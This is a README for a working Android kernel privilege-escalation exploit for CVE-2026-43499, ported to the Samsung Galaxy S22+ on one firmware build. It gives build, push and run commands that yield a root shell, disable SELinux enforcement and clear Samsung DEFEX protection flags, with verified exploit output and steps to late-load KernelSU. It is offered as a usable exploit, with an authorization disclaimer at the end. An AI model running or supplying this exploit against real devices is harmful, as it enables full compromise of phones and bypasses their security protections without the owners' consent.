# CVE-2026-43499 - Galaxy S22+

This repository contains a device-specific port of the CVE-2026-43499
exploit for the Samsung Galaxy S22+ (SM-S906B, Exynos 2200).

## Supported target

```text
Device: Samsung Galaxy S22+ (SM-S906B)
Codename: g0s
Android: 16 / API 36
Build number: BP2A.250605.031.A3.S906BXXSNGZD7
Build display ID: BP2A.250605.031.A3.S906BXXSNGZD7
Build fingerprint: samsung/g0sxxx/essi:16/BP2A.250605.031.A3/S906BXXSNGZD7:user/release-keys
Kernel: 5.10.237-android12-9-31999025-abS906BXXSNGZD7
Architecture: aarch64
```

The offsets and structure layouts in this repository are specific to the
firmware above. Other models and firmware builds are not supported by this
target profile.

## Reference source

This port is based on the exploit implementation published in:

- [NebuSec/CyberMeowfia — IonStack/CVE-2026-43499/exploit](https://github.com/NebuSec/CyberMeowfia/tree/b850d3bddc74c3328d5fbcc0568d21962b55d949/IonStack/CVE-2026-43499/exploit)
- [BuSung-dev/CVE-2026-43499-S25U](https://github.com/BuSung-dev/CVE-2026-43499-S25U)
- Upstream revision used as the porting base: `b850d3bddc74c3328d5fbcc0568d21962b55d949`

The S22 Ultra (b0s) `S908BXXSMGZB2` port was used as the immediate base for
this g0s adaptation. The upstream Apache License 2.0 is retained in [LICENSE](LICENSE).

## Main porting changes

- Ported the exploit from the S22 Ultra (b0s / `S908BXXSMGZB2`) target to the
  S22+ (g0s / `S906BXXSNGZD7`) target on the same `android12-5.10` KMI.
- Added the `g0s` / `S906BXXSNGZD7` target offsets
  (`src/targets/S906BXXSNGZD7/target.h`) generated from the GZD7 kernel
  `Image`/`vmlinux` via `target_generator/generate_target.py`
  (`P0_KERNEL_PHYS_LOAD=0x80000000` from sboot analysis, `text_offset=0`;
  KCFI shadow kernel so raw function addresses are used for `_JT_OFF`).
- **Samsung DEFEX bypass**: clears `selinux_state.enforcing` *and* the four
  Samsung DEFEX per-feature runtime status bytes (`global_privesc_status`,
  `global_safeplace_status`, `global_integrity_status`,
  `global_immutable_status`) via the pipe write primitive so the
  UMH-spawned root shell can exec `/data` binaries. Without this, DEFEX
  Safeplace kills `ksud` late-load:
  `[DEFEX] Safeplace violation [task=sh (/system/bin/sh), child=/data/local/tmp/ksud, uid=0]`.
- Retained the `exp32` route (futex choreography, 32-bit stack stamp,
  `sched_setattr` in an embedded 32-bit child stage, `src/exp32/`), the
  tracefs-based automatic KASLR slide recovery, the CFI/FOPS stage, and the
  physical read/write primitive for v5.10.
- Retained the KDP-safe `system_unbound_wq` user-mode-helper root path and the
  socket-backed root command helper at `/data/local/tmp/cve-2026-43499-root`.
- Restores the global ashmem FOPS pointer immediately after establishing the
  arbitrary read/write primitive.
- Retains reclaimed pages in a detached `cve43499-hold` process after success
  so dangling kernel references cannot be recycled into unrelated slab objects.
- Runs failed race attempts in independent child processes and automatically
  retries with a device-tuned delay sequence.

## Build

Set `ANDROID_NDK_HOME` to Android NDK r27+ (r28 used for validation) or a
compatible toolchain, then run from this directory:

```sh
make PROJECT=S906BXXSNGZD7 clean preload root-helper
```

> The 32-bit `exp32` stage is built with `arm-linux-gnueabi-gcc` and embedded
> into the preload via `src/exp32_blob.S`. Rebuilding `exp32` from scratch
> requires the `arm-linux-gnueabi` cross-libc (`errno.h`) on the host;
> incremental builds reuse the embedded blob.

Outputs:

```text
build/S906BXXSNGZD7/bin/cve-2026-43499
build/S906BXXSNGZD7/bin/cve-2026-43499-root
```

The preload is also published as
`artifacts/g0s-S906BXXSNGZD7/cve-2026-43499-app.so`.

## Deploy

```sh
adb push build/S906BXXSNGZD7/bin/cve-2026-43499 /data/local/tmp/cve-2026-43499
adb push build/S906BXXSNGZD7/bin/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root
```

## Run

Execute the exploit stage to start the root daemon:

```sh
adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"
```

Once successful, pop an interactive root shell from anywhere on the device:

```sh
adb shell "/data/local/tmp/cve-2026-43499-root"
```

Or execute root commands directly:

```sh
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
```

The default run makes up to 16 independent attempts; the g0s GZD7 validation
used `EXPLOIT_ATTEMPTS=24` and succeeded on attempt 1. Each failed child exits
before the next attempt, so its file descriptors and heap-shaping allocations
are released instead of accumulating inside one long-lived exploit process.

Override the attempt count or base delay when collecting timing data:

```sh
adb shell "EXPLOIT_ATTEMPTS=24 PSELECT_DELAY_USEC=20000 LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"
```

Verified result on `S906BXXSNGZD7`:

```text
[+] [cfi-trace6-physbase] PHYS_SLOT_MATCH slot=15 phys_slide=00078000 ...
[+] pipe physrw ... read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
[+] exploit completed attempt=1/24
```

Interactive root shell session:

```text
g0s:/data/local/tmp $ ./cve-2026-43499-root
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
:/ # getenforce
Permissive
```

The initial stage is race-based. A child that exits with `root=0` is retried
automatically. Successful execution restores `ashmem_misc.fops`, switches
SELinux to permissive, clears the four DEFEX status bytes, and starts the
root helper daemon until the next reboot.

## Persistent root with KernelSU

The exploit above only holds root for the current boot. To get a Manager app
and `su`-style control for the rest of the session, load a KernelSU LKM as a
late-load module through the root helper.

This target reuses the S22 (r0s) `S901BXXSNGZD7` KDP pair verbatim — same
`android12-5.10` KMI and Samsung KDP/RKP/DEFEX patch set, so no
device-specific KernelSU module build is required:

- `kernelsu/ksud-r0s-S901BXXSNGZD7-kdp` — late-load daemon
- `kernelsu/android12-5.10_kernelsu-r0s-S901BXXSNGZD7-kdp.ko` — LKM

Push both and run the late-load from the root shell:

```sh
adb push kernelsu/ksud-r0s-S901BXXSNGZD7-kdp /data/local/tmp/ksud
adb push kernelsu/android12-5.10_kernelsu-r0s-S901BXXSNGZD7-kdp.ko /data/local/tmp/kernelsu.ko
adb shell chmod 755 /data/local/tmp/ksud
adb shell "/data/local/tmp/cve-2026-43499-root -c '/data/local/tmp/ksud late-load /data/local/tmp/kernelsu.ko'"
```

Open the KernelSU Manager app on the device — it reports
`Working <LKM> [Jailbreak mode]` and exposes superuser management
(confirmed on-device, including via the Root My Galaxy app's Shizuku mode).

Since this is a late-loaded LKM (not a patched boot image), it does not
survive a reboot — re-run the exploit and re-run `ksud late-load` each time
the device restarts.

> [!WARNING]
> **Reliability & Kernel Panic Notice:**
> The race stage is timing-sensitive and may fail or cause a kernel panic on
> some runs. Clean boots offer a higher success rate.

> [!TIP]
> **Stability & Success Rate Recommendations:**
> - **Reboot Device**: For the highest success rate, reboot the device before
>   running the exploit to ensure clean slab/heap state.
> - **Close Background Apps**: Ensure all background applications are closed.
> - **Unlock Screen & Stay Idle**: Keep the device unlocked and do not
>   interact with or use the phone while the exploit is running, as active
>   user input/background tasks can disturb timing and potentially trigger a
>   kernel panic.

Use only on devices you own or are explicitly authorized to test.
